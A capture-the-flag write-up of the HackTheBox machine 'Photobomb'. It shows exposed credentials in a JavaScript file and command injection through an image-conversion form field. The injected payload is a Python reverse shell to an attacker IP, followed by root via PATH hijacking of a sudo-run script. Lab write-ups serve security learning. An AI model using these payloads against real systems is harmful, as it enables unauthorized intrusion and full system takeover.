![[photobomb.png]]
# Enum

We start with `autorecon`

```bash
export HOST=photobomb.htb
sudo $(which autorecon) $HOST --global.domain $HOST
```


There are creds in `photobomb.js`

```javascript
function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
  }
}
window.onload = init;

```

Look at `/printer` source code

```html
<!DOCTYPE html>
<html>
<head>
  <title>Photobomb</title>
  <link type="text/css" rel="stylesheet" href="styles.css" media="all" />
</head>
<body>
  <div id="container">
    <header>
      <h1><a href="/">Photobomb</a></h1>
    </header>
    <form id="photo-form" action="/printer" method="post">
      <h3>Select an image</h3>
      <fieldset id="image-wrapper">
      <input type="radio" name="photo" value="voicu-apostol-MWER49YaD-M-unsplash.jpg" id="voicu-apostol-MWER49YaD-M-unsplash.jpg" checked="checked" /><label for="voicu-apostol-MWER49YaD-M-unsplash.jpg" style="background-image: url(ui_images/voicu-apostol-MWER49YaD-M-unsplash.jpg)"></label><input type="radio" name="photo" value="masaaki-komori-NYFaNoiPf7A-unsplash.jpg" id="masaaki-komori-NYFaNoiPf7A-unsplash.jpg"/><label for="masaaki-komori-NYFaNoiPf7A-unsplash.jpg" style="background-image: url(ui_images/masaaki-komori-NYFaNoiPf7A-unsplash.jpg)"></label><input type="radio" name="photo" value="andrea-de-santis-uCFuP0Gc_MM-unsplash.jpg" id="andrea-de-santis-uCFuP0Gc_MM-unsplash.jpg"/><label for="andrea-de-santis-uCFuP0Gc_MM-unsplash.jpg" style="background-image: url(ui_images/andrea-de-santis-uCFuP0Gc_MM-unsplash.jpg)"></label><input type="radio" name="photo" value="tabitha-turner-8hg0xRg5QIs-unsplash.jpg" id="tabitha-turner-8hg0xRg5QIs-unsplash.jpg"/><label for="tabitha-turner-8hg0xRg5QIs-unsplash.jpg" style="background-image: url(ui_images/tabitha-turner-8hg0xRg5QIs-unsplash.jpg)"></label><input type="radio" name="photo" value="nathaniel-worrell-zK_az6W3xIo-unsplash.jpg" id="nathaniel-worrell-zK_az6W3xIo-unsplash.jpg"/><label for="nathaniel-worrell-zK_az6W3xIo-unsplash.jpg" style="background-image: url(ui_images/nathaniel-worrell-zK_az6W3xIo-unsplash.jpg)"></label><input type="radio" name="photo" value="kevin-charit-XZoaTJTnB9U-unsplash.jpg" id="kevin-charit-XZoaTJTnB9U-unsplash.jpg"/><label for="kevin-charit-XZoaTJTnB9U-unsplash.jpg" style="background-image: url(ui_images/kevin-charit-XZoaTJTnB9U-unsplash.jpg)"></label><input type="radio" name="photo" value="calvin-craig-T3M72YMf2oc-unsplash.jpg" id="calvin-craig-T3M72YMf2oc-unsplash.jpg"/><label for="calvin-craig-T3M72YMf2oc-unsplash.jpg" style="background-image: url(ui_images/calvin-craig-T3M72YMf2oc-unsplash.jpg)"></label><input type="radio" name="photo" value="eleanor-brooke-w-TLY0Ym4rM-unsplash.jpg" id="eleanor-brooke-w-TLY0Ym4rM-unsplash.jpg"/><label for="eleanor-brooke-w-TLY0Ym4rM-unsplash.jpg" style="background-image: url(ui_images/eleanor-brooke-w-TLY0Ym4rM-unsplash.jpg)"></label><input type="radio" name="photo" value="finn-whelen-DTfhsDIWNSg-unsplash.jpg" id="finn-whelen-DTfhsDIWNSg-unsplash.jpg"/><label for="finn-whelen-DTfhsDIWNSg-unsplash.jpg" style="background-image: url(ui_images/finn-whelen-DTfhsDIWNSg-unsplash.jpg)"></label><input type="radio" name="photo" value="almas-salakhov-VK7TCqcZTlw-unsplash.jpg" id="almas-salakhov-VK7TCqcZTlw-unsplash.jpg"/><label for="almas-salakhov-VK7TCqcZTlw-unsplash.jpg" style="background-image: url(ui_images/almas-salakhov-VK7TCqcZTlw-unsplash.jpg)"></label><input type="radio" name="photo" value="mark-mc-neill-4xWHIpY2QcY-unsplash.jpg" id="mark-mc-neill-4xWHIpY2QcY-unsplash.jpg"/><label for="mark-mc-neill-4xWHIpY2QcY-unsplash.jpg" style="background-image: url(ui_images/mark-mc-neill-4xWHIpY2QcY-unsplash.jpg)"></label><input type="radio" name="photo" value="wolfgang-hasselmann-RLEgmd1O7gs-unsplash.jpg" id="wolfgang-hasselmann-RLEgmd1O7gs-unsplash.jpg"/><label for="wolfgang-hasselmann-RLEgmd1O7gs-unsplash.jpg" style="background-image: url(ui_images/wolfgang-hasselmann-RLEgmd1O7gs-unsplash.jpg)"></label>
      </fieldset>
      <fieldset id="image-settings">
      <label for="filetype">File type</label>
      <select name="filetype" title="JPGs work on most printers, but some people think PNGs give better quality">
        <option value="jpg">JPG</option>
        <option value="png">PNG</option>
        </select>
      <div class="product-list">
        <input type="radio" name="dimensions" value="3000x2000" id="3000x2000" checked="checked"/><label for="3000x2000">3000x2000 - mousemat</label>
        <input type="radio" name="dimensions" value="1000x1500" id="1000x1500"/><label for="1000x1500">1000x1500 - mug</label>
        <input type="radio" name="dimensions" value="600x400" id="600x400"/><label for="600x400">600x400 - phone cover</label>
        <input type="radio" name="dimensions" value="300x200" id="300x200"/><label for="300x200">300x200 - keyring</label>
        <input type="radio" name="dimensions" value="150x100" id="150x100"/><label for="150x100">150x100 - usb stick</label>
        <input type="radio" name="dimensions" value="30x20" id="30x20"/><label for="30x20">30x20 - micro SD card</label>
      </div>
      </fieldset>
      <div class="controls">
        <button type="submit">download photo to print</button>
      </div>
    </form>
  </div>
</body>
</html>
```

There are some specious form with `POST` action to download the image.
Intercept it with BurpSuite to get the request
```burp
POST /printer HTTP/1.1
Host: photobomb.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 77
Origin: http://photobomb.htb
Authorization: Basic cEgwdDA6YjBNYiE=
Connection: close
Referer: http://photobomb.htb/printer
Upgrade-Insecure-Requests: 1

photo=kevin-charit-XZoaTJTnB9U-unsplash.jpg&filetype=png&dimensions=1000x1500
```

We send the request, and we got the image with `png` extension downloaded.
![[downloaded_image.png]]

Humm. As the Burp request, and at the HTML code, We know that the source image is with `jpg`, so i guess there is some internal process to convert the extension from `jpg` to `png`.
So we will tried to inject to the convert process.

```burp
POST /printer HTTP/1.1
Host: photobomb.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 97
Origin: http://photobomb.htb
Authorization: Basic cEgwdDA6YjBNYiE=
Connection: close
Referer: http://photobomb.htb/printer
Upgrade-Insecure-Requests: 1

photo=kevin-charit-XZoaTJTnB9U-unsplash.jpg&filetype=png;ping -c 20 10.10.16.27&dimensions=1000x1500
```
We test if there are code injection that will ping to our machine.

At our machine, open new tab and start to hear `ping-pong` with `tcpdump`

```bash
tcpdump -nni tun0
```

And we got the `ping-pong` request coming:
```bash
22:13:05.628664 IP 10.129.227.188 > 10.10.16.27: ICMP echo request, id 2, seq 1, length 64
22:13:05.628755 IP 10.10.16.27 > 10.129.227.188: ICMP echo reply, id 2, seq 1, length 64
22:13:06.630718 IP 10.129.227.188 > 10.10.16.27: ICMP echo request, id 2, seq 2, length 64
22:13:06.630823 IP 10.10.16.27 > 10.129.227.188: ICMP echo reply, id 2, seq 2, length 64
22:13:07.632448 IP 10.129.227.188 > 10.10.16.27: ICMP echo request, id 2, seq 3, length 64
22:13:07.632465 IP 10.10.16.27 > 10.129.227.188: ICMP echo reply, id 2, seq 3, length 64
22:13:08.641009 IP 10.129.227.188 > 10.10.16.27: ICMP echo request, id 2, seq 4, length 64
22:13:08.641026 IP 10.10.16.27 > 10.129.227.188: ICMP echo reply, id 2, seq 4, length 64
22:13:09.635603 IP 10.129.227.188 > 10.10.16.27: ICMP echo request, id 2, seq 5, length 64
22:13:09.635623 IP 10.10.16.27 > 10.129.227.188: ICMP echo reply, id 2, seq 5, length 64
22:13:10.637349 IP 10.129.227.188 > 10.10.16.27: ICMP echo request, id 2, seq 6, length 64
22:13:10.637366 IP 10.10.16.27 > 10.129.227.188: ICMP echo reply, id 2, seq 6, length 64
22:13:11.638806 IP 10.129.227.188 > 10.10.16.27: ICMP echo request, id 2, seq 7, length 64
22:13:11.638822 IP 10.10.16.27 > 10.129.227.188: ICMP echo reply, id 2, seq 7, length 64
22:13:12.642177 IP 10.129.227.188 > 10.10.16.27: ICMP echo request, id 2, seq 8, length 64
22:13:12.642194 IP 10.10.16.27 > 10.129.227.188: ICMP echo reply, id 2, seq 8, length 64
22:13:13.642541 IP 10.129.227.188 > 10.10.16.27: ICMP echo request, id 2, seq 9, length 64
22:13:13.642557 IP 10.10.16.27 > 10.129.227.188: ICMP echo reply, id 2, seq 9, length 64
22:13:14.646085 IP 10.129.227.188 > 10.10.16.27: ICMP echo request, id 2, seq 10, length 64
22:13:14.646102 IP 10.10.16.27 > 10.129.227.188: ICMP echo reply, id 2, seq 10, length 64
22:13:15.644788 IP 10.129.227.188 > 10.10.16.27: ICMP echo request, id 2, seq 11, length 64
22:13:15.644805 IP 10.10.16.27 > 10.129.227.188: ICMP echo reply, id 2, seq 11, length 64
22:13:16.645370 IP 10.129.227.188 > 10.10.16.27: ICMP echo request, id 2, seq 12, length 64
22:13:16.645387 IP 10.10.16.27 > 10.129.227.188: ICMP echo reply, id 2, seq 12, length 64
22:13:17.646986 IP 10.129.227.188 > 10.10.16.27: ICMP echo request, id 2, seq 13, length 64
22:13:17.647002 IP 10.10.16.27 > 10.129.227.188: ICMP echo reply, id 2, seq 13, length 64
22:13:18.648082 IP 10.129.227.188 > 10.10.16.27: ICMP echo request, id 2, seq 14, length 64
22:13:18.648101 IP 10.10.16.27 > 10.129.227.188: ICMP echo reply, id 2, seq 14, length 64
22:13:19.651983 IP 10.129.227.188 > 10.10.16.27: ICMP echo request, id 2, seq 15, length 64
22:13:19.652000 IP 10.10.16.27 > 10.129.227.188: ICMP echo reply, id 2, seq 15, length 64
22:13:20.650673 IP 10.129.227.188 > 10.10.16.27: ICMP echo request, id 2, seq 16, length 64
22:13:20.650688 IP 10.10.16.27 > 10.129.227.188: ICMP echo reply, id 2, seq 16, length 64
22:13:21.651939 IP 10.129.227.188 > 10.10.16.27: ICMP echo request, id 2, seq 17, length 64
22:13:21.651954 IP 10.10.16.27 > 10.129.227.188: ICMP echo reply, id 2, seq 17, length 64
22:13:22.654892 IP 10.129.227.188 > 10.10.16.27: ICMP echo request, id 2, seq 18, length 64
22:13:22.654909 IP 10.10.16.27 > 10.129.227.188: ICMP echo reply, id 2, seq 18, length 64
22:13:23.654395 IP 10.129.227.188 > 10.10.16.27: ICMP echo request, id 2, seq 19, length 64
22:13:23.654414 IP 10.10.16.27 > 10.129.227.188: ICMP echo reply, id 2, seq 19, length 64
22:13:24.655103 IP 10.129.227.188 > 10.10.16.27: ICMP echo request, id 2, seq 20, length 64
22:13:24.655119 IP 10.10.16.27 > 10.129.227.188: ICMP echo reply, id 2, seq 20, length 64
22:13:24.928369 IP 10.129.227.188.80 > 10.10.16.27.58632: Flags [P.], seq 1:460, ack 619, win 505, options [nop,nop,TS val 1109234227 ecr 2438549067], length 459: HTTP: HTTP/1.1 500 Internal Server Error
22:13:24.928414 IP 10.10.16.27.58632 > 10.129.227.188.80: Flags [.], ack 460, win 501, options [nop,nop,TS val 2438570177 ecr 1109234227], length 0
22:13:25.191299 IP 10.129.227.188.80 > 10.10.16.27.58632: Flags [F.], seq 460, ack 619, win 505, options [nop,nop,TS val 1109234227 ecr 2438549067], length 0
22:13:25.191977 IP 10.10.16.27.58632 > 10.129.227.188.80: Flags [F.], seq 619, ack 461, win 501, options [nop,nop,TS val 2438570440 ecr 1109234227], length 0
22:13:25.454254 IP 10.129.227.188.80 > 10.10.16.27.58632: Flags [.], ack 620, win 505, options [nop,nop,TS val 1109234755 ecr 2438570440], length 0
```

So we will replace the `ping` with our reverse shell code
```bash
export RHOST="10.10.16.27";export RPORT=1234;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
```

Finally the Burp Request will like this

```burp
POST /printer HTTP/1.1
Host: photobomb.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 295
Origin: http://photobomb.htb
Authorization: Basic cEgwdDA6YjBNYiE=
Connection: close
Referer: http://photobomb.htb/printer
Upgrade-Insecure-Requests: 1

photo=kevin-charit-XZoaTJTnB9U-unsplash.jpg&filetype=png;export RHOST="10.10.16.27";export RPORT=1234;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'&dimensions=1000x1500
```


![[burp_repeater.png]]
We open `nc` to listen at our machine:

```bash
rlwrap -cAr nc -lvnp 1234
```

We send request at Burp. And we got shell

```
listening on [any] 1234 ...



connect to [10.10.16.27] from (UNKNOWN) [10.129.227.188] 46968
wizard@photobomb:~/photobomb$
wizard@photobomb:~/photobomb$
wizard@photobomb:~/photobomb$
wizard@photobomb:~/photobomb$

wizard@photobomb:~/photobomb$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
wizard:x:1000:1000:wizard:/home/wizard:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
wizard@photobomb:~/photobomb$
```


# Foothold

- `id`
```bash
uid=1000(wizard) gid=1000(wizard) groups=1000(wizard)
```
- `sudo`

```bash
wizard@photobomb:~/photobomb$ sudo -l
sudo -l
Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
```


Take a look at `cleanup.sh`
```bash
cat /opt/cleanup.sh
```

Output:

```bash
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```

Well, there a `find` command without absolute path.

# Privilege Escalate

Here step to get root.

- Move to `/tmp` and create `find`
```
cd /tmp
touch find
echo "/bin/bash -p" > find
chmod +x find
```

Run the `/opt/cleanup.sh` with env

```bash
sudo PATH=/tmp:$PATH /opt/cleanup.sh
```

Output:
```bash
wizard@photobomb:/tmp$ sudo PATH=/tmp:$PATH /opt/cleanup.sh
sudo PATH=/tmp:$PATH /opt/cleanup.sh
root@photobomb:/home/wizard/photobomb#

root@photobomb:/home/wizard/photobomb# id
id
uid=0(root) gid=0(root) groups=0(root)
root@photobomb:/home/wizard/photobomb#
```

![[get_root.png]]
